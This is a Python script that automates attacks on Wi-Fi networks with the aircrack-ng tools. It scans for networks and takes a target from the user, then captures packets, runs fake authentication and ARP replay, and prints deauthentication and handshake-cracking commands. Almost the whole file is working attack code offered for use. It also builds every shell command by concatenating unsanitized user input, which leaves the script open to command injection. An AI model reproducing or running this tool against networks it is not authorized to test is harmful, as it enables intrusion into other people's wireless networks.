#!/usr/bin/env python

import os
import thread

#After the 2nd window starts scrolling:
#############################
#sudo aircrack-ng output*.cap
#############################

#Maybe use this to force a handshake
#aireplay-ng -0 #OFTIMES -a BSSID -c SOMEMACADDRESSCONNECTEDTOIT mon0

def getNetworks(device):
    getNetworksProcess = os.popen("sudo iwlist " + device + " scan | grep -E '(Channel:|Address:|ESSID:)'").read()
    
    rawNetworks = getNetworksProcess.splitlines()
    
    refinedNetworks = []
    
    for i in range(0, len(rawNetworks), 3):
        refinedNetworks.append((rawNetworks[i].strip()[len(rawNetworks[i].strip())-17:len(rawNetworks[i].strip())],     #Gets the MAC Address
                                rawNetworks[i+1].strip().strip('Channel:'),                                                    #Gets the channel
                                rawNetworks[i+2].strip().strip('ESSID:').strip("\"")                                           #Gets the ESSID
                                ))
    return refinedNetworks

def setNetworkInfo(networkList, target):
    for item in networkList:
        global bssid
        global channel
        global essid
        if(item[2] == target):
            bssid = item[0]
            channel = item[1]
            essid = item[2]
            break
        if(item[0] == target):
            bssid = item[0]
            channel = item[1]
            essid = item[2]
            break
            
def setDeviceInfo(device):
    getDeviceInfoProcess = os.popen("ifconfig | grep " + device).read().split(' ')
    
    while '' in getDeviceInfoProcess:
        getDeviceInfoProcess.remove('')
    while '\n' in getDeviceInfoProcess:
        getDeviceInfoProcess.remove('\n')
    
    global mac
    mac = getDeviceInfoProcess[len(getDeviceInfoProcess) - 1]
    
def printInfo():
    print "Device: " + device
    print "MAC: " + mac
    print "BSSID: " + bssid
    print "Channel: " + channel
    print "ESSID: " + essid
    
def startMonitoring():
    os.system("sudo airmon-ng start " + device + " " + channel)

def stopMonitoring():
    os.system("sudo airmon-ng stop mon0")
    
def capturePackets():
    os.system("sudo airodump-ng -c " + channel +" --bssid " + bssid +" -w output mon0 --ignore-negative-one")
    
def cleanUpFiles():
        os.system("sudo rm -f output*")
        os.system("sudo rm -f replay*")

def printNetworks(networkList):
    print "========================================================================"
    for item in networkList:
        print item[0] + "\t" + item[2]
    print "========================================================================"
    
def authenticateWithWPA():
    command = "sudo aireplay-ng -1 0 -a " + bssid + " -h " + mac +" mon0 --ignore-negative-one"
    os.system("gnome-terminal -e \"" + command + "\"")

def replayARPRequest():
    command = "sudo aireplay-ng -3 -b " + bssid + " -h " + mac + " mon0 --ignore-negative-one"
    os.system("gnome-terminal -e \"" + command + "\"")

#So terrible plz don't look at this. It does good things though.
def displayDeauthCommand():
    command = "sudo aireplay-ng -0 1 -a " + bssid + " -c MAC mon0 --ignore-negative-one"
    os.system("gnome-terminal -e 'bash -c \"" + "echo " + command +
                                                ";echo sudo aircrack-ng output*.cap" 
                                                "; exec bash\"'")

#Do this to keep the output clean for later on
os.system("sudo echo What device to use?")
device = raw_input()
mac = ''
bssid = ''
channel = ''
essid = ''

networkList = getNetworks(device)

printNetworks(networkList)


target = raw_input("Target ID?\n")
if (target != "exit"):
    
    try:
        setNetworkInfo(networkList, target)
        setDeviceInfo(device)
        
        startMonitoring()
        thread.start_new_thread(capturePackets, ())
        thread.start_new_thread(authenticateWithWPA, ())
        thread.start_new_thread(replayARPRequest, ())
        thread.start_new_thread(displayDeauthCommand, ())
        
        while 1:
            pass
    except:
        pass
    
    stopMonitoring()
    cleanUpFiles()